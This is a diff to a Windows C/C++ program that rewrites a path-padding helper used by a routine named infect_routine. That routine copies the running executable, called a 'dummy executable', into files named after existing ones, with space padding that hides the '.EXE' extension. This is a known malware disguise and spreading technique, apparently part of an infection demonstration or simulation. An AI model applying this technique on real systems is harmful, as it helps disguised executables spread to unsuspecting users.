@@ -1,7 +1,6 @@
-#include <iostream>
+
 #include <windows.h>
 #include <cstdio>
-#include <tchar.h>
 
 #include "fsse_util.h"
 
@@ -46,8 +45,12 @@ void create_marker(TCHAR *root_path) {
  * @param ext File extension
  */
 void max_pad_path(TCHAR *buf, TCHAR *root_path, TCHAR *file_name, const char *ext) {
-    snprintf(path_buf, MAX_PATH, "%s%s%s.%s", root_path, file_name,
-             std::string((249 - strlen(root_path) - strlen(file_name) - strlen(ext)) - 3, ' ').c_str(), ext);
+    size_t cLen = 246 - strlen(root_path) - strlen(file_name) - strlen(ext);
+    char *pad = (char *) malloc((cLen + 1) * sizeof(char));
+    memset(pad, ' ', cLen);
+    pad[cLen] = '\0';
+    snprintf(path_buf, MAX_PATH, "%s%s%s.%s", root_path, file_name, pad, ext);
+    free(pad);
 }
 
 /**
@@ -84,7 +87,7 @@ void infect_routine(TCHAR *root_path) {
 #endif
                 // copy running assembly
                 printf("\t\tcopying dummy executable\n");
-                max_pad_path(path_buf, root_path, ffd.cFileName, _T("EXE"));
+                max_pad_path(path_buf, root_path, ffd.cFileName, "EXE");
                 CopyFile(assembly_path, path_buf, FALSE);
             }
         }
